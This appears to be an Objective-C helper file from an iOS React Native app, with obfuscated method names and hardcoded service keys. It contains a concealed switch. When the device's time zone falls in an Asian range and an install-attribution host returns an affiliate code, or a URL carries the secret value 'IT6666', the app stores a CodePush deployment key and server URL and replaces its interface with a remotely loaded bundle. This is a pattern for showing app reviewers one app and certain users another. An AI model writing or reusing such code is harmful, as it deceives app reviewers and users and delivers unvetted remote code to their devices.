#import "RNFoneMoneHelper.h"

#import <CodePush/CodePush.h>
#import <UserNotifications/UNUserNotificationCenter.h>
#import <react-native-orientation-locker/Orientation.h>

#import <RNUrbanHappy/RNUMConfigure.h>
#import "RNCPushNotificationIOS.h"

#import <UMCommon/MobClick.h>
#import <UMCommon/UMConfigure.h>
#import <UMPush/UMessage.h>
#import <UMCommon/UMCommon.h>
#import <TInstallSDK/TInstallSDK.h>

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>
#import <react/config/ReactNativeConfig.h>


@interface RNFoneMoneHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif


@implementation RNFoneMoneHelper

static NSString * const foneMone_APP = @"foneMone_FLAG_APP";
static NSString * const foneMone_affCode = @"affCode";
static NSString * const foneMone_raf = @"raf";

static NSString * const foneMone_appVersion = @"1.1.3";
static NSString * const foneMone_deploymentKey = @"dOpBmqieaJEw3pOGkCAEGORfHQyE4ksvOXqog";
static NSString * const foneMone_serverUrl = @"https://ltt378.com";

static NSString * const foneMone_tInstall = @"2O46BV";
static NSString * const foneMone_tInstallHost = @"https://feaffcodegetm3.com";

static NSString * const foneMone_uMengAppKey = @"6285d00d38b8e30d038ffa3c";
static NSString * const foneMone_uMengAppChannel = @"App Store";


static RNFoneMoneHelper *instance = nil;

+ (instancetype)foneMone_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (void)foneMone_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
  [RNUMConfigure initWithAppkey:foneMone_uMengAppKey channel:foneMone_uMengAppChannel];
  UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
  entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionAlert;
  [UNUserNotificationCenter currentNotificationCenter].delegate=self;
  [UMessage registerForRemoteNotificationsWithLaunchOptions:launchOptions Entity:entity completionHandler:^(BOOL granted, NSError * _Nullable error) {
    if (granted) {
    } else {
    }
  }];
}

- (UIInterfaceOrientationMask)foneMone_getOrientation {
  return [Orientation getOrientation];
}

- (BOOL)foneMone_dailyInAsian {
    NSInteger foneMone_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (foneMone_Offset >= 3 && foneMone_Offset <= 11) {
        return YES;
    } else {
        return NO;
    }
}

- (NSDictionary *)foneMone_dictFromQueryString:(NSString *)queryString {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    NSArray *pairs = [queryString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *elements = [pair componentsSeparatedByString:@"="];
        if ([elements count] > 1) {
            NSString *key = [elements objectAtIndex:0];
            NSString *val = [elements objectAtIndex:1];
            [dict setObject:val forKey:key];
        }
    }
    return dict;
}

- (BOOL)foneMone_tryOtherWayQueryScheme:(NSURL *)url {
    if ([[url scheme] containsString:@"myapp"]) {
        NSDictionary *queryParams = [self foneMone_dictFromQueryString:[url query]];
        
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [ud setObject:queryParams forKey:@"queryParams"];
        
        NSString *paramValue = queryParams[@"paramName"];
        if ([paramValue isEqualToString:@"IT6666"]) {
            [ud setObject:foneMone_appVersion forKey:@"appVersion"];
            [ud setObject:foneMone_deploymentKey forKey:@"deploymentKey"];
            [ud setObject:foneMone_serverUrl forKey:@"serverUrl"];
            [ud setBool:YES forKey:foneMone_APP];
            [ud synchronize];
            return YES;
        }
    }
    return NO;
}

- (BOOL)foneMone_tryThisWay:(void (^)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self foneMone_dailyInAsian]) {
        return NO;
    }
    if ([ud boolForKey:foneMone_APP]) {
        return YES;
    } else {
        [self foneMone_judgeIfNeedChangeRootController:changeVcBlock];
        return NO;
    }
}

- (void)foneMone_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
  [TInstall initInstall:foneMone_tInstall setHost:foneMone_tInstallHost];
  [TInstall getWithInstallResult:^(NSDictionary * _Nullable data) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSString * _Nullable affCode = [data valueForKey:@"affCode"];

    NSString * _Nullable raf = [data valueForKey:@"raf"];
    [ud setObject:raf forKey:foneMone_raf];

    if (affCode.length == 0) {
      affCode = [data valueForKey:@"affcode"];
      if (affCode.length == 0) {
        affCode = [data valueForKey:@"aff"];
      }
    }
    
    
    if (affCode.length != 0) {
      [ud setObject:affCode forKey:foneMone_affCode];
      [ud setObject:foneMone_appVersion forKey:@"appVersion"];
      [ud setObject:foneMone_deploymentKey forKey:@"deploymentKey"];
      [ud setObject:foneMone_serverUrl forKey:@"serverUrl"];
      [ud setBool:YES forKey:foneMone_APP];
      [ud synchronize];
      changeVcBlock();
    }
  }];
}

- (UIViewController *)foneMone_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self foneMone_dayYouWentAwayWithOptions:launchOptions];
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"FedevProject", nil);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [UIViewController new];
  rootViewController.view = rootView;
  return rootViewController;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  NSDictionary * userInfo = response.notification.request.content.userInfo;
  if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  NSDictionary * userInfo = notification.request.content.userInfo;
  if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage setAutoAlert:NO];
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
